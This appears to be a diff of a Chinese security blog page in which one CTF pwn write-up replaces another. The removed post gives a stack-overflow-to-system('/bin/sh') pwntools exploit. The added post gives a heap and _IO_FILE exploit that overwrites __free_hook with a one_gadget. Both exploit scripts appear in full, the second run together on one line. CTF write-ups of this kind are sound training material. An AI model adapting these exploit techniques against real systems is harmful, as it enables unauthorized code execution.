@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="找了半天才找到在哪有栈溢出QAQ 是在输入完用户名再输入1之后， 12345678char s; // [esp+11h] [ebp-17h]printf(&amp;quot;Enter password: &amp;quot;);fflush(stdout);fgets(&amp;amp;s, 100, stdin);puts(&amp;quot;Authentification failed&amp;quot;);fflush(st">
+<meta name="description" content="一言难尽的awd">
 <meta property="og:type" content="article">
-<meta property="og:title" content="十一欢乐赛-bss_stack">
-<meta property="og:url" content="http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/index.html">
+<meta property="og:title" content="领航杯2019线下pwn">
+<meta property="og:url" content="http://yoursite.com/2019/12/14/领航杯2019线下pwn/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="找了半天才找到在哪有栈溢出QAQ 是在输入完用户名再输入1之后， 12345678char s; // [esp+11h] [ebp-17h]printf(&amp;quot;Enter password: &amp;quot;);fflush(stdout);fgets(&amp;amp;s, 100, stdin);puts(&amp;quot;Authentification failed&amp;quot;);fflush(st">
+<meta property="og:description" content="一言难尽的awd">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-10-03T09:27:54.000Z">
+<meta property="og:updated_time" content="2019-12-14T14:31:43.998Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="十一欢乐赛-bss_stack">
-<meta name="twitter:description" content="找了半天才找到在哪有栈溢出QAQ 是在输入完用户名再输入1之后， 12345678char s; // [esp+11h] [ebp-17h]printf(&amp;quot;Enter password: &amp;quot;);fflush(stdout);fgets(&amp;amp;s, 100, stdin);puts(&amp;quot;Authentification failed&amp;quot;);fflush(st">
+<meta name="twitter:title" content="领航杯2019线下pwn">
+<meta name="twitter:description" content="一言难尽的awd">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>十一欢乐赛-bss_stack | 4eriri&#39;s blog</title>
+<title>领航杯2019线下pwn | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -200,11 +200,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-十一欢乐赛-bss-stack" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-领航杯2019线下pwn" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/10/03/十一欢乐赛-bss-stack/" class="article-date">
-      <time datetime="2018-10-03T08:24:15.000Z" itemprop="datePublished">2018-10-03</time>
+      <a href="/2019/12/14/领航杯2019线下pwn/" class="article-date">
+      <time datetime="2019-12-14T14:24:23.000Z" itemprop="datePublished">2019-12-14</time>
 </a>
 
 
@@ -219,7 +219,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      十一欢乐赛-bss_stack
+      领航杯2019线下pwn
     </h1>
   
 
@@ -236,14 +236,16 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>找了半天才找到在哪有栈溢出QAQ</p>
-<p>是在输入完用户名再输入1之后，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+11h] [ebp-17h]</span><br><span class="line"></span><br><span class="line">printf(&quot;Enter password: &quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">fgets(&amp;s, 100, stdin);</span><br><span class="line">puts(&quot;Authentification failed&quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">return sleep(1u);</span><br></pre></td></tr></table></figure>
-<p>fgets可以读入100个字符，s大小为0x17,所以输入超过0x17+4的话就可以覆盖返回地址。</p>
-<p>这题是有system函数调用的，只是没有/bin/sh字符串，所以只需要找到system地址，再在username地址写入/bin/sh就行了，另外call system的时候会push一个返回地址，再往后才是参数command，因此要留出4个字节的offset脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10011)</span><br><span class="line">sh.recvuntil(&apos;User name : &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Action: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Enter password: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(0x08048500)+&apos;a&apos;*4+p32(0x08049dc8)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>之后cat flag就可以得到flag了</p>
-
+        <p><del>一言难尽的awd</del></p>
+<a id="more"></a>
+<p>TWCTF2017的原题<a href="http://brieflyx.me/2017/ctf-writeups/twctf3-2017-parrot/" target="_blank" rel="noopener">parrot</a></p>
+<p>首先触发<code>malloc_consolidate</code>，leak出libc地址。</p>
+<p>然后利用任意地址写0去修改stdin的<code>_IO_FILE</code>结构。</p>
+<blockquote>
+<p><strong>在stdin的<code>_IO_FILE</code>结构中，<code>_IO_buf_base</code>和<code>_IO_buf_end</code>指示了这个FILE使用buffer的位置，由于程序做了setbuf的操作，这个buffer就位于结构体内部<code>_shortbuf</code>的位置。如果将一个0写到<code>_IO_buf_base</code>的最低位，就可以将buffer往前扩展。在scanf输入时，输入的数据会覆盖掉<code>_IO_buf_base</code>指针自身，我们可以把它修改成<code>__free_hook</code>的地址。这样在本身buffer里面的字符消耗完之后，就可以进一步去修改<code>__free_hook</code>了</strong></p>
+</blockquote>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *context(arch=&apos;amd64&apos;, os=&apos;linux&apos;, log_level=&apos;debug&apos;)one=[0x45216,0x4526a,0xf02a4,0xf1147]debug = 1if debug:	sh = process(&quot;./pwn&quot;)else:	sh = remote(&quot;172.20.106.101&quot;, 9999)def buf(size,content):	sh.recvuntil(&quot;The size is:&quot;)	sh.sendline(str(size))	sh.recvuntil(&quot;The buffer is:&quot;)	sh.send(content)sleep(3)buf(0x10,&apos;\n&apos;)buf(0x20,&apos;\n&apos;)buf(0x400,&apos;a&apos;*8)sh.recvuntil(&quot;a&quot;*8)leak=u64(sh.recv(8))libcbase=leak-0x7fcca726cb78+0x7fcca6ea8000log.success(&quot;libcbase: &quot;+hex(libcbase))stdin=libcbase-0x7f4e07da2000+0x7f4e081668e0log.success(&quot;stdin: &quot;+hex(stdin))freehook=libcbase-0x7fc892bc3000+0x7fc892f897a8log.success(&quot;freehook: &quot;+hex(freehook))buf(stdin+0x38+1,&apos;\n&apos;)sh.recvuntil(&apos;The size is:\n&apos;)sh.send(&apos;0&apos; * 0x16 + &apos;1\x00&apos; + p64(freehook-8) + p64(freehook+8))#通过输入一些字符来让buffer全都消耗掉for i in range(17):    sh.recvuntil(&apos;The buffer is:\n&apos;)    sh.send(&apos;\n&apos;)    sleep(0.1)</span><br><span class="line">sh.recvuntil(&apos;The size is:\n&apos;)sh.send(&apos;\x00&apos;*8 + p64(libcbase+one[1]))sh.recvuntil(&apos;The buffer is:\n&apos;)sh.send(&apos;\n&apos;)#gdb.attach(sh)sh.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -251,13 +253,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/10/03/十一欢乐赛-bss-stack/">十一欢乐赛-bss_stack</a></p>
+        <p><span>本文标题:</span><a href="/2019/12/14/领航杯2019线下pwn/">领航杯2019线下pwn</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2018-10-03, 16:24:15</p>
-        <p><span>最后更新:</span>2018-10-03, 17:27:54</p>
+        <p><span>发布时间:</span>2019-12-14, 22:24:23</p>
+        <p><span>最后更新:</span>2019-12-14, 22:31:43</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/10/03/十一欢乐赛-bss-stack/" title="十一欢乐赛-bss_stack">http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/12/14/领航杯2019线下pwn/" title="领航杯2019线下pwn">http://yoursite.com/2019/12/14/领航杯2019线下pwn/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/12/14/领航杯2019线下pwn/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -269,16 +271,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/10/03/十一欢乐赛-pwn4/">
-                    十一欢乐赛-pwn4
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/10/02/cgctf-born/">
-                    CGCTF-born
+                <a href="/2019/11/14/RoarCTF2019-easy-pwn/">
+                    RoarCTF2019-easy_pwn
                 </a>
             </div>
         
@@ -326,7 +322,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"十一欢乐赛-bss_stack　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"领航杯2019线下pwn　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -345,8 +341,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/';
-            this.page.identifier = '2018/10/03/十一欢乐赛-bss-stack/';
+            this.page.url = 'http://yoursite.com/2019/12/14/领航杯2019线下pwn/';
+            this.page.identifier = '2019/12/14/领航杯2019线下pwn/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -368,15 +364,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/10/03/十一欢乐赛-pwn4/" title="上一篇: 十一欢乐赛-pwn4">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/10/02/cgctf-born/" title="下一篇: CGCTF-born">
+            <a href="/2019/11/14/RoarCTF2019-easy-pwn/" title="下一篇: RoarCTF2019-easy_pwn">
                 <i class="fa fa-angle-right"></i>
             </a>
         
